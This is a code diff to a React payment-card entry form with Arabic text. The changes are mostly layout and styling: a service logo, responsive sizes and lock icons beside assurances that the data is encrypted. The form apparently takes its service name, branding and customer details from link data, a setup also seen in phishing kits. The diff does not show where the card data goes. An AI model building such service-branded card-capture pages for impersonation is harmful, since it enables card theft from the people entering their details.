@@ -40,6 +40,7 @@ const PaymentCardInput = () => {
   const [cvv, setCvv] = useState("");
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [logoError, setLogoError] = useState(false);
 
   // Get customer info and selected bank from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
@@ -237,50 +238,48 @@ const PaymentCardInput = () => {
       description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Selected Bank/Country Info */}
-      {(selectedBank || selectedCountryData) && (
+      {/* Service Logo */}
+      {branding.logo && !logoError ? (
+        <div className="mb-6 flex items-center justify-center">
+          <img 
+            src={branding.logo} 
+            alt={serviceName}
+            className="h-12 sm:h-16 object-contain max-w-[180px] sm:max-w-[240px]"
+            style={{ filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.1))' }}
+            onError={() => setLogoError(true)}
+          />
+        </div>
+      ) : (
         <div 
-          className="rounded-lg p-3 sm:p-4 mb-6 flex items-center gap-3"
+          className="mb-6 p-3 rounded-lg flex items-center justify-center"
           style={{
-            background: `${branding.colors.primary}10`,
-            border: `1px solid ${branding.colors.primary}30`
+            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
           }}
         >
-          {selectedCountryData && (
-            <span className="text-2xl">{selectedCountryData.flag}</span>
-          )}
-          {selectedBank && (
-            <Building2 className="w-5 h-5" style={{ color: selectedBank.color || branding.colors.primary }} />
-          )}
-          <div className="flex-1">
-            <p className="text-xs text-muted-foreground">البنك المختار</p>
-            <p className="text-sm font-semibold">
-              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
-            </p>
-          </div>
+          <h2 className="text-lg sm:text-xl font-bold text-white">{serviceName}</h2>
         </div>
       )}
 
       {/* Security Notice */}
       <div
-        className="mb-6 p-4 rounded-xl border-2"
+        className="mb-6 p-3 sm:p-4 rounded-xl border-2"
         style={{ backgroundColor: `${branding.colors.secondary}10`, borderColor: branding.colors.secondary }}
       >
         <div className="flex items-center gap-3">
           <div
-            className="w-10 h-10 rounded-full flex items-center justify-center"
+            className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center flex-shrink-0"
             style={{ backgroundColor: branding.colors.secondary }}
           >
-            <Shield className="w-5 h-5 text-white" />
+            <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
           </div>
-          <div>
+          <div className="flex-1">
             <h3
-              className="font-bold text-sm"
+              className="font-bold text-xs sm:text-sm"
               style={{ color: branding.colors.text }}
             >
-              دفع آمن ومشفر
+              🔒 دفع آمن ومشفر
             </h3>
-            <p className="text-xs" style={{ color: branding.colors.textLight }}>
+            <p className="text-[10px] sm:text-xs" style={{ color: branding.colors.textLight }}>
               معلومات بطاقتك محمية بأعلى معايير الأمان
             </p>
           </div>
@@ -289,31 +288,31 @@ const PaymentCardInput = () => {
 
       {/* Visual Card Display */}
       <div 
-        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
+        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-xl"
         style={{
           background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-          minHeight: '180px'
+          minHeight: '160px'
         }}
       >
-        <div className="absolute top-4 right-4 flex items-center gap-2">
-          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
+        <div className="absolute top-3 sm:top-4 right-3 sm:right-4 flex items-center gap-2">
+          <CreditCard className="w-8 h-8 sm:w-10 sm:h-10 text-white/80" />
           {cardValid === true && (
-            <CheckCircle2 className="w-6 h-6 text-green-300" />
+            <CheckCircle2 className="w-5 h-5 sm:w-6 sm:h-6 text-green-300" />
           )}
         </div>
         
         {/* Card Type Badge */}
         {cardNumber.length > 0 && (
-          <div className="absolute top-4 left-4">
-            <span className="text-xs text-white/70 uppercase font-semibold">
+          <div className="absolute top-3 sm:top-4 left-3 sm:left-4">
+            <span className="text-[10px] sm:text-xs text-white/70 uppercase font-semibold tracking-wider">
               {detectCardType(cardNumber)}
             </span>
           </div>
         )}
         
         {/* Card Number Display */}
-        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
-          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
+        <div className="mt-12 sm:mt-14 mb-4 sm:mb-5">
+          <div className="flex gap-1.5 sm:gap-2 text-white text-lg sm:text-xl md:text-2xl font-mono">
             <span>••••</span>
             <span>••••</span>
             <span>••••</span>
@@ -321,16 +320,16 @@ const PaymentCardInput = () => {
           </div>
         </div>
 
-        <div className="flex justify-between items-end text-white">
-          <div>
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
-            <p className="text-base sm:text-lg font-mono">
+        <div className="flex justify-between items-end text-white gap-4">
+          <div className="flex-shrink-0">
+            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">EXPIRES</p>
+            <p className="text-sm sm:text-base font-mono">
               {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
             </p>
           </div>
-          <div className="text-right">
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
-            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
+          <div className="text-right min-w-0 flex-1">
+            <p className="text-[9px] sm:text-[10px] opacity-70 mb-1">CARDHOLDER</p>
+            <p className="text-sm sm:text-base font-bold truncate">{cardName || "YOUR NAME"}</p>
           </div>
         </div>
       </div>
@@ -391,7 +390,7 @@ const PaymentCardInput = () => {
         </div>
         
         {/* Expiry & CVV Row */}
-        <div className="grid grid-cols-3 gap-3">
+        <div className="grid grid-cols-3 gap-2 sm:gap-3">
           <div>
             <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
               <Calendar className="w-4 h-4" />
@@ -459,18 +458,19 @@ const PaymentCardInput = () => {
 
         {/* Security Info */}
         <div
-          className="mt-6 p-4 rounded-lg"
+          className="mt-6 p-3 sm:p-4 rounded-lg border"
           style={{
-            backgroundColor: branding.colors.surface || '#F5F5F5'
+            backgroundColor: branding.colors.surface || '#F5F5F5',
+            borderColor: `${branding.colors.primary}20`
           }}
         >
-          <div className="flex items-start gap-3">
-            <Lock className="w-5 h-5 mt-0.5" style={{ color: branding.colors.secondary }} />
-            <div>
-              <h4 className="font-semibold text-sm mb-1" style={{ color: branding.colors.text }}>
-                محمي بتشفير SSL
+          <div className="flex items-start gap-2 sm:gap-3">
+            <Lock className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.secondary }} />
+            <div className="flex-1">
+              <h4 className="font-semibold text-xs sm:text-sm mb-1" style={{ color: branding.colors.text }}>
+                🔒 محمي بتشفير SSL
               </h4>
-              <p className="text-xs" style={{ color: branding.colors.textLight }}>
+              <p className="text-[10px] sm:text-xs" style={{ color: branding.colors.textLight }}>
                 جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
               </p>
             </div>
@@ -481,29 +481,29 @@ const PaymentCardInput = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full h-14 text-lg font-bold mt-6 text-white hover:opacity-90 transition-all"
+          className="w-full h-12 sm:h-14 text-base sm:text-lg font-bold mt-6 text-white hover:opacity-90 hover:scale-[1.02] transition-all"
           disabled={isSubmitting || !cardValid}
           style={{
             background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
             borderRadius: '12px',
-            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
+            boxShadow: '0 4px 16px rgba(0,0,0,0.2)'
           }}
         >
           {isSubmitting ? (
             <>
-              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
-              جاري المعالجة...
+              <div className="animate-spin rounded-full h-4 h-4 sm:h-5 sm:w-5 border-b-2 border-white ml-2"></div>
+              <span className="text-sm sm:text-base">جاري المعالجة...</span>
             </>
           ) : (
             <>
               <span className="ml-2">دفع الآن</span>
-              <ArrowLeft className="w-5 h-5 mr-2" />
+              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
             </>
           )}
         </Button>
 
-        <p className="text-xs text-center mt-4" style={{ color: branding.colors.textLight }}>
-          بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
+        <p className="text-[10px] sm:text-xs text-center mt-4" style={{ color: branding.colors.textLight }}>
+          🔒 بالمتابعة، أنت توافق على الشروط والأحكام
         </p>
       </form>
     
